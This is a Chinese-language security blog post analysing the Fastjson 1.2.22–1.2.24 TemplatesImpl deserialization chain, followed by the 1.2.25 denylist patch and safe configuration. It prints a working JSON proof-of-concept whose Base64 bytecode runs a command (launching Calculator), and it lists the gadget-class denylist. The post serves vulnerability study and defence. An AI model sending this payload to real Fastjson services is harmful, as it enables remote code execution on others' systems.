---
title: Fastjson TemplatesImpl 利用链
categories:
  - Web安全
tags:
  - Fastjson反序列化
  - 漏洞分析
  - JavaSec
toc: true 文章目录
author: BlBana
date: 2020-04-01 18:00:28
description:
comments:
original:
permalink:
---

> 入坑系列第三篇，Fastjson TemplatesImpl利用链分析，当Feature.SupportNonPublicField设置时，反序列化调用getOutputProperties方法实例化恶意类导致命令执行。主要是Fastjson 1.2.22 —— 1.2.24版本的利用方式，除此之外，在这个版本里还有一条JNDI的利用链，等着下一篇分析。真的是越分析越嗨皮，一直分析一直爽。

<!-- more -->

---

# Fastjson TemplatesImpl 利用链

# 影响范围

Fastjson在1.2.24以及之前版本存在远程代码执行高危安全漏洞，之后的版本引入了autoType的黑白名单机制。在Fastjson 1.2.22 — 1.2.24 版本的反序列化漏洞利用，主要有以下两种已知利用链

- TemplateImpl
- JNDI

这次主要分析TemplateImpl利用链，下篇开坑JNDI

# 漏洞复现

## 限制条件

`Feature.SupportNonPublicField` 需要开启，因为`_bytecodes` 和 `_outputProperties` 两个关键属性是私有的

## 复现

[具体PoC构造我会上传的Repo里](https://github.com/BlBana/Learn-Java-Deserialization-Vulnerability/tree/master/src/main/java/cc/blbana/Fastjson)，这里执行代码后成功执行命令，弹出计算器

![Fastjson%20TemplatesImpl/Untitled.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonTemplatesImpl/0.png)

## PoC分析

```json
{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["yv66vgAAADQANAoACAAlCgAmACcIACgKACYAKQgAKgcAKwoABgAlBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAB5MY2MvYmxiYW5hL0Zhc3Rqc29uL0ZKUGF5bG9hZDsBAApFeGNlcHRpb25zBwAtAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwcALgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAB3BheWxvYWQBAApTb3VyY2VGaWxlAQAORkpQYXlsb2FkLmphdmEMAAkACgcALwwAMAAxAQA9L1N5c3RlbS9BcHBsaWNhdGlvbnMvQ2FsY3VsYXRvci5hcHAvQ29udGVudHMvTWFjT1MvQ2FsY3VsYXRvcgwAMgAzAQAEY2FsYwEAHGNjL2JsYmFuYS9GYXN0anNvbi9GSlBheWxvYWQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAGAAgAAAAAAAQAAQAJAAoAAgALAAAATQACAAEAAAAXKrcAAbgAAhIDtgAEV7gAAhIFtgAEV7EAAAACAAwAAAASAAQAAAAMAAQADQANAA4AFgAPAA0AAAAMAAEAAAAXAA4ADwAAABAAAAAEAAEAEQABABIAEwACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAOAA8AAAAAAAEAFAAVAAEAAAABABYAFwACABAAAAAEAAEAGAABABIAGQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGQANAAAAKgAEAAAAAQAOAA8AAAAAAAEAFAAVAAEAAAABABoAGwACAAAAAQAcAB0AAwAQAAAABAABABgACQAeAB8AAgALAAAAQQACAAIAAAAJuwAGWbcAB0yxAAAAAgAMAAAACgACAAAAHAAIAB0ADQAAABYAAgAAAAkAIAAhAAAACAABACIADwABABAAAAAEAAEAEQABACMAAAACACQ="],'_name':'a.b','_tfactory':{},"_outputProperties":{},"_name":"a","allowedProtocols":"all"}
```

后面会详细分析整个利用链的调用过程，先来分析下PoC里的关键key：

- @type ：用于存放反序列化时的目标类型，这里指定的是TemplatesImpl，Fastjson最终会按照这个类反序列化得到实例，因为调用了getOutputProperties方法，实例化了传入的bytecodes类，导致命令执行。需要注意的是，Fastjson默认只会反序列化public修饰的属性，outputProperties和_bytecodes由private修饰，必须加入`Feature.SupportNonPublicField` 在parseObject中才能触发；
- _bytecodes：继承`AbstractTranslet` 类的恶意类字节码，并且使用`Base64`编码
- _name：调用`getTransletInstance` 时会判断其是否为null，为null直接return，不会进入到恶意类的实例化过程；
- _tfactory：`defineTransletClasses` 中会调用其`getExternalExtensionsMap` 方法，为null会出现异常；
- outputProperties：漏洞利用时的关键参数，由于Fastjson反序列化过程中会调用其`getOutputProperties` 方法，导致`bytecodes`字节码成功实例化，造成命令执行。

# 漏洞详情

## 漏洞分析

### TemplatesImpl.getOutputProperties()

这次分析从后向前看，先来分析下TemplateImpl实例化后是如何执行命令的，先放上调用链：

```json
TemplatesImpl() -> getOutputProperties() -> newTransformer() -> getTransletInstance() -> defineTransletClasses() -> newInstance()
```

在TemplatesImpl类实例化后，会依次将其属性实例化并set到TemplatesImpl实例中，到了_outputProperties属性时会调用其`getOutputProperties()`方法，其中调用了`newTransformer()`方法

```java
public synchronized Properties getOutputProperties() {
        try {
            return newTransformer().getOutputProperties();
        }
        catch (TransformerConfigurationException e) {
            return null;
        }
    }
```

`newTransformer()`中会调用`getTransletInstance()` 方法，继续跟进一下

```java
public synchronized Transformer newTransformer()
        throws TransformerConfigurationException
    {
        TransformerImpl transformer;

        transformer = new TransformerImpl(getTransletInstance(), _outputProperties,
            _indentNumber, _tfactory);

        if (_uriResolver != null) {
            transformer.setURIResolver(_uriResolver);
        }

        if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) {
            transformer.setSecureProcessing(true);
        }
        return transformer;
    }
```

其中有两个关键的方法，`defineTransletClasses()` 和 `newInstance()` ，后者就不用多说了，实例化`_class[_transletIndex]` 中的Class，主要看一下前者是怎么把恶意类带到数组中去的

![Fastjson%20TemplatesImpl/Untitled%201.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonTemplatesImpl/1.png)

跟进`defineTransletClasses()`方法，其中调用了`defindClass`方法处理恶意类`FJPayload`的字节码，根据Java官方文档可以知道，`defindClass` 可以从byte[]还原出一个Class对象，成功帮我们把字节码还原为了`FJPayload Class` 并放入到了_class[]数组中

![Fastjson%20TemplatesImpl/Untitled%202.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonTemplatesImpl/2.png)

回到`getTransletInstance()`方法后，成功调用`newInstance()` 反射实例化恶意类，成功执行命令

![Fastjson%20TemplatesImpl/Untitled%203.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonTemplatesImpl/3.png)

以上是整个TemplatesImpl链的核心过程，下面继续分析下，Fastjson中是如何把这个类实例化出来的，并调用到`getOutputProperties()`方法的。

### TemplatesImpl反序列化

[上篇文章已经分析过Object反序列化流程了](https://drops.blbana.cc/2020/03/29/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/)，这里主要分析下这条链里核心的地方。首先获取第一个key值为@type

![Fastjson%20TemplatesImpl/Untitled%204.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonTemplatesImpl/4.png)

根据key为默认的`JSON.DEFAULT_TYPE_KEY` 并且`Feature.DisableSpecialKeyDetect`选项未开启，根据key从json字符串中解析出类名，并获取其Class对象到clazz中

![Fastjson%20TemplatesImpl/Untitled%205.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonTemplatesImpl/5.png)

获取反序列化器`JavaBeanDeserializer`，开始进行反序列化

![Fastjson%20TemplatesImpl/Untitled%206.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonTemplatesImpl/6.png)

在`JavaBeanDeserializer`中会先根据偏移找到下一个要解析的key值`_bytecodes` ，然后将之前获取到的`TemplatesImpl Class`对象进行实例化，获取对象object

![Fastjson%20TemplatesImpl/Untitled%207.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonTemplatesImpl/7.png)

![Fastjson%20TemplatesImpl/Untitled%208.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonTemplatesImpl/8.png)

获取到`TemplatesImpl`对象和第一个字段名`_bytecodes` 进入到`this.parseField`开始解析属性，选取字节数组的反序列化器解析字段，将获取到的`value`通过`field.set`加入到object

![Fastjson%20TemplatesImpl/Untitled%209.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonTemplatesImpl/9.png)

![Fastjson%20TemplatesImpl/Untitled%2010.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonTemplatesImpl/10.png)

中间的属性是同样的方式进行反序列化，直接跳到`_outputProperties`属性，进入到`JavaBeanDeserializer.parseField`方法

![Fastjson%20TemplatesImpl/Untitled%2011.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonTemplatesImpl/11.png)

根据其类型在`this.sortedFieldDeserializers` 中找到了符合条件的反序列化器

![Fastjson%20TemplatesImpl/Untitled%2012.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonTemplatesImpl/12.png)

调用`fieldDeserializer` 解析该字段，可以看到在`fieldInfo`中已经包含了关键的**getOutputProperties Method对象**

> 这里可能会有疑问，为什么_outputProperties key会关联到，outputProerties的getter，这里主要是因为smartMatch中有一些特殊处理，具体分析下面会单独讲到

![Fastjson%20TemplatesImpl/Untitled%2013.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonTemplatesImpl/13.png)

继续跟进由于该字段类型为1所示，使用2的Map类型反序列化器，对其反序列化获取value

![Fastjson%20TemplatesImpl/Untitled%2014.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonTemplatesImpl/14.png)

获取到value后，进入到`this.setValue`中进行set值操作，先从刚刚提到的`fieldInfo`中获取到了**getOutputProperties Method对象，**然后反射调用方法，进入**TemplatesImpl.getOutputProperties()方法**，之后流程就跟上个部分分析的一致了

![Fastjson%20TemplatesImpl/Untitled%2015.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonTemplatesImpl/15.png)

![Fastjson%20TemplatesImpl/Untitled%2016.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonTemplatesImpl/16.png)

## 调用链

这里贴上整个过程中的调用链，画出了核心的几个方法，有兴趣的自己可以跟一下

![Fastjson%20TemplatesImpl/Untitled%2017.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonTemplatesImpl/17.png)

## PoC细节

> 接下来就是一些PoC构造的细节分析，直接决定了能否成功触发

### 1. _bytecodes 为什么进行Base64编码 ？

Fastjson在调用`ObjectArrayCodec.deserialze` 中，调用`parser.parseArray`方法对字节数组进行解析

![Fastjson%20TemplatesImpl/Untitled%2018.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonTemplatesImpl/18.png)

获取反序列化器进行反序列化操作，在`lexer.bytesValue`会有一次Base64解码操作

![Fastjson%20TemplatesImpl/Untitled%2019.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonTemplatesImpl/19.png)

![Fastjson%20TemplatesImpl/Untitled%2020.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonTemplatesImpl/20.png)

![Fastjson%20TemplatesImpl/Untitled%2021.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonTemplatesImpl/21.png)

### 2. this.sortedFieldDeserializers和this.extraFieldDeserializers两组List区别

先看下`FieldDeserializers` 是存放了各个属性的反序列化器，其中主要属性和方法：

- `fieldInfo`存放属性名，属性getter/setter，Field对象等信息；
- `clazz` 存放属性所属类的Class对象
- `parseField()` 根据fieldType获取对应的fieldValueDeserilizer完成对属性值的反序列化 和 赋值操作

1. **this.sortedFieldDeserializers**

   `sortedFieldDeserializers`存放的属性主要来源于beanInfo，**在beanInfo的build方法中会将setter/getter符合条件的FieldInfo增加到beanInfo.sortedFields中。**其中的FieldInfo都包含了Method对象，最终都通过Method.invoke()进行赋值；

   > [具体setter/getter条件见上篇文章](https://drops.blbana.cc/2020/03/29/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/#set%E6%96%B9%E6%B3%95)

   ![Fastjson%20TemplatesImpl/Untitled%2022.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonTemplatesImpl/22.png)

2. **this.extraFieldDeserializers**

`extraFieldDeserializers` 会将`getDeclaredFields` 符合修饰符条件的Field增加进去。

FieldInfo Method对象为空，最终都通过Field.set()进行赋值；

```java
ConcurrentHashMap extraFieldDeserializers = new ConcurrentHashMap(1, 0.75F, 1);
	  Field[] fields = this.clazz.getDeclaredFields();
	  Field[] var11 = fields;
	  int var12 = fields.length;
	
	  for(int var13 = 0; var13 < var12; ++var13) {
	      Field field = var11[var13];
	      String fieldName = field.getName();
	      if (this.getFieldDeserializer(fieldName) == null) {
	          int fieldModifiers = field.getModifiers();
	          if ((fieldModifiers & 16) == 0 && (fieldModifiers & 8) == 0) {
	              extraFieldDeserializers.put(fieldName, field);
	          }
	      }
	  }
```

### 3. 为什么反序列化会调用`getOutputProperties`方法

> outputProperties 关联 getOutputProperties

[setter和getter的选择条件](https://drops.blbana.cc/2020/03/29/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/#set%E6%96%B9%E6%B3%95)，上篇已经提过在获取到Class所有的Fields和Methods后，会按照一些条件进行筛选，获取到`getOutputProperties` 方法，根据方法名获取属性名，将Method对象整理到FieldInfo，最终到了`sortedFieldDeserializers` 中

![Fastjson%20TemplatesImpl/Untitled%2023.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonTemplatesImpl/23.png)

### 4. `_outputProperties`为什么会关联调用`getOutputProperties` 方法

> _outputProperties 处理为 outputProperties

在`smartMatch`中会根据key值outputProperties从sortedFieldDeserializers中选择对应属性的反序列化器，第一轮未匹配到时，会自动去掉 **"_"** 再次获取

![Fastjson%20TemplatesImpl/Untitled%2024.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonTemplatesImpl/24.png)

最终在sortedFieldDeserializers中找到了问题3中关联的`getOutputProperties`方法

![Fastjson%20TemplatesImpl/Untitled%2025.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonTemplatesImpl/25.png)

### 5. 为什么要继承`AbstractTranslet`类 ？

`defineTransletClasses` 中会对bytecodes的类进行判断，父类为`AbstractTranslet`时会给transletIndex赋值为0，默认为-1，不是`AbstractTranslet`子类导致异常

![Fastjson%20TemplatesImpl/Untitled%2026.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonTemplatesImpl/26.png)

# 安全修复

## 补丁分析

根据[官方公告](https://github.com/alibaba/fastjson/wiki/security_update_20170315)在1.2.25版本之后加入了黑白名单机制，这里跟进分析一下

在DefaultJSONParser.parseObject中将加载类的`TypeUtils.loadClass`方法替换为了`this.config.checkAutoType()`方法

![Fastjson%20TemplatesImpl/Untitled%2027.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonTemplatesImpl/27.png)

1.2.25版本中默认情况下，autoTypeSupport为`false`，**TemplatesImpl利用链会在进入到checkAutoType后被denyList中的黑名单匹配到抛出异常。**

- `autoTypeSupport`为`false`，先过黑名单过滤，再过白名单过滤，若白名单匹配到就加载此类，否则会报错；这种情况下相对安全一些，黑白名单都未匹配的情况下，会抛出异常。

- `config.setAutoTypeSupport(true)`修改`autoTypeSupport`为`true`，先过白名单过滤，若白名单匹配到就加载此类，否则进入黑名单；这种情况下，如果黑白名单都未过滤，会被`TypeUtils.loadClass` 加载。

  ```java
  public Class<?> checkAutoType(String typeName, Class<?> expectClass) {
          if (typeName == null) {
              return null;
          } else {
              String className = typeName.replace('$', '.');
              if (this.autoTypeSupport || expectClass != null) {
                  int i;
                  String deny;
                  for(i = 0; i < this.acceptList.length; ++i) {
                      deny = this.acceptList[i];
                      if (className.startsWith(deny)) {
                          return TypeUtils.loadClass(typeName, this.defaultClassLoader);
                      }
                  }
  
                  for(i = 0; i < this.denyList.length; ++i) {
                      deny = this.denyList[i];
                      if (className.startsWith(deny)) {
                          throw new JSONException("autoType is not support. " + typeName);
                      }
                  }
              }
  
              Class<?> clazz = TypeUtils.getClassFromMapping(typeName);
              if (clazz == null) {
                  clazz = this.deserializers.findClass(typeName);
              }
  
              if (clazz != null) {
                  if (expectClass != null && !expectClass.isAssignableFrom(clazz)) {
                      throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
                  } else {
                      return clazz;
                  }
              } else {
                  if (!this.autoTypeSupport) {
                      String accept;
                      int i;
                      for(i = 0; i < this.denyList.length; ++i) {
                          accept = this.denyList[i];
                          if (className.startsWith(accept)) {
                              throw new JSONException("autoType is not support. " + typeName);
                          }
                      }
  
                      for(i = 0; i < this.acceptList.length; ++i) {
                          accept = this.acceptList[i];
                          if (className.startsWith(accept)) {
                              clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader);
                              if (expectClass != null && expectClass.isAssignableFrom(clazz)) {
                                  throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
                              }
  
                              return clazz;
                          }
                      }
                  }
  								// 为true时，若白名单未过滤，黑名单未过滤，都会在这里完成类加载
                  if (this.autoTypeSupport || expectClass != null) {
                      clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader);
                  }
  
                  if (clazz != null) {
                      if (ClassLoader.class.isAssignableFrom(clazz) || DataSource.class.isAssignableFrom(clazz)) {
                          throw new JSONException("autoType is not support. " + typeName);
                      }
  
                      if (expectClass != null) {
                          if (expectClass.isAssignableFrom(clazz)) {
                              return clazz;
                          }
  
                          throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
                      }
                  }
  								// 为false时，若黑名单未过滤，白名单未过滤，在这里会抛出异常
                  if (!this.autoTypeSupport) {
                      throw new JSONException("autoType is not support. " + typeName);
                  } else {
                      return clazz;
                  }
              }
          }
      }
  ```

### 1.2.25黑名单列表

```json
['bsh',
 'com.mchange',
 'com.sun.',
 'java.lang.Thread',
 'java.net.Socket',
 'java.rmi',
 'javax.xml',
 'org.apache.bcel',
 'org.apache.commons.beanutils',
 'org.apache.commons.collections.Transformer',
 'org.apache.commons.collections.functors',
 'org.apache.commons.collections4.comparators',
 'org.apache.commons.fileupload',
 'org.apache.myfaces.context.servlet',
 'org.apache.tomcat',
 'org.apache.wicket.util',
 'org.codehaus.groovy.runtime',
 'org.hibernate',
 'org.jboss',
 'org.mozilla.javascript',
 'org.python.core',
 'org.springframework']
```

## 修复方案

- **1.2.28/1.2.29/1.2.30/1.2.31**或者**更新**版本
- 使用白名单过滤，避免黑名单被绕过

## 安全编码

### 添加autotype白名单

```java
// 多个包名前缀，分多次addAccept
1. 代码中配置
ParserConfig.getGlobalInstance().addAccept("com.taobao.pac.client.sdk.dataobject.");

// 多个包名前缀，用逗号隔开
2. JVM启动参数
-Dfastjson.parser.autoTypeAccept=com.taobao.pac.client.sdk.dataobject.,com.cainiao.

// 多个包名前缀，用逗号隔开
3. fastjson.properties文件配置
fastjson.parser.autoTypeAccept=com.taobao.pac.client.sdk.dataobject.,com.cainiao.
```

## autotype功能

- 默认情况下基于白名单进行过滤，黑白名单都未过滤到时，会抛出异常
- 打开后基于内置的黑名单实现检测，黑白名单未过滤到时，会被加载存在一定风险。后续Fastjson大多都是围绕黑名单绕过展开的。

```java
// JVM启动参数
-Dfastjson.parser.autoTypeSupport=true

// 代码中配置
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
```

### 添加autotype黑名单

```java
// xx.xxx是包名前缀，如果有多个包名前缀，用逗号隔开
1. JVM启动参数
-Dfastjson.parser.deny=xx.xxx

// xx.xxx是包名前缀，如果有多个包名前缀，用逗号隔开
2. fastjson.properties文件配置
-Dfastjson.parser.deny=xx.xxx

// xx.xxx是包名前缀，如果有多个包名前缀，用逗号隔开
3. 代码中配置
ParserConfig.getGlobalInstance().addDeny("xx.xxx");
```

# 总结

根据[廖大神博客](http://xxlegend.com/2017/05/03/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/)提到的，由于`Feature.SupportNonPublicField` 是1.2.22版本引入，1.2.25加入了黑白名单机制，这个PoC作用版本就在1.2.22和1.2.24内。

这篇主要分析了TemplatesImpI利用链，在这个版本后，Fastjson引入了黑白名单机制，之后的问题基本就都是和黑白名单斗智斗勇的时候了。下一篇分析JDBCRowSetlmpl利用链。

## Logs

- [Fastjson 1.2.24 2017年开始发现反序列化漏洞，官方发布升级公告](https://github.com/alibaba/fastjson/wiki/security_update_20170315)
- Fastjson 1.2.25 加入黑白名单机制
- TemplatesImpI
- JDBCRowSetlmpl
- 各类绕过黑名单

# 参考链接

- [https://p0sec.net/index.php/archives/123/](https://p0sec.net/index.php/archives/123/)
- [https://www.mi1k7ea.com/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/](https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/)
- [http://xxlegend.com/2017/05/03/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/](http://xxlegend.com/2017/05/03/title- fastjson 远程反序列化poc的构造和分析/)

